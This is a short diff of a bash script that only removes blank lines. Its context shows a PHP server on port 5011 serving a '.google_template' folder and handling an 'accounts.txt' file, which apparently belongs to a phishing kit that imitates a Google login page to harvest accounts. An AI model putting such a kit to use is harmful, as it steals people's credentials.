@@ -19,7 +19,6 @@ on_exit(){
 	exit
 }
 
-
 host_local_server(){
 	php -S 0.0.0.0:5011 -t .google_template/ > /dev/null 2>&1 &
 	echo -e "Local Server: \e[1;33mhttp://${LOCAL_IP}:5011"
@@ -32,7 +31,6 @@ listen_for_requests(){
 		rm ".google_template/accounts.txt"
 	fi
 }
-
 
 trap 'on_exit' SIGINT
 
